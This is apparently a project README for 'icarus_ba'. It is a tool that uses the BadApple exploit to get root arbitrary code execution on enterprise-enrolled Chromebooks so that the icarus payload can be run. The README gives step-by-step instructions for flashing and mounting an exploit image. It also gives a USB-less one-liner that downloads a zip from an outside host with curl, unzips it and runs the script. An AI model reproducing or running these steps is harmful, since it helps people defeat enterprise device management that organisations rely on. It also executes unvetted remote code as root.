# icarus but for badapple
# UPDATED TO HAVE THE NEW ICARUS CERT
pretty straightforward process. this acts as a way to execute the icarus payload initally meant to be executed in shims. \
BadApple is an exploit to gain ACE(arbitary code execution) as root in developer mode whilst enterprise enrolled. SH1mmer does the same thing, but some boards have been keyrolled.

## steps
now, you can choose 2 different ways to carry this out.
1. requires usb, no wifi
2. usbless, requires wifi

### 1. usb method
1. from the Releases page of this repository, download the image provided, which is named `icarus_ba.img`
2. use chromebook recovery utility or balenaEtcher or dd or your preferred usb flashing tool to flash the image to a thumbdrive
3. use BadApple to obtain a shell
4. plug in the usb stick with the flashed image
5. find the usb stick identifier with `fdisk -l` 
6. mount the image with `mkdir /icarus && mount /dev/sdX /icarus`, where `X` is your usb identifier, e.g. `/dev/sda`
7. now, to execute the icarus payload, run `cd /icarus && ./icarus_ba.sh`

### 2. usbless method
1. enter miniOS
2. when the frecon screen loads, click Next
3. next, connect to an available wifi network
4. when the wifi has connected, DO NOT PROCEED. we now use BadApple to obtain a shell
5. run these commands to start the icarus payload: `mkdir icarus && cd icarus && curl -O cdn.fanqyxl.net/icarus_ba.zip && unzip icarus_ba.zip && ./icarus_ba.sh`

## build a badapple icarus image
this is useless for the average user, only use this if you want to customize PKIMetadata or icarus_ba.sh

1. cd into the root directory of this repository
2. run `sudo ./image_create.sh`.
3. a image will be placed in the root directory of this repo called `icarus_ba.img`

it is an ext4 image that has an original size of 100MB, which is then shrinked to its minimum after adding PKIMetadata and icarus_ba.sh.

## credits
- appleflyer: finding BadApple, making the original payload
- xmb9/stella: helping with stateful detection by telling me about cgpt
- sophie: telling me about the issue with stateful detection
- kilo: making this usbless
- fanqyxl: helping by making this usbless, and for generating new icarus certs.
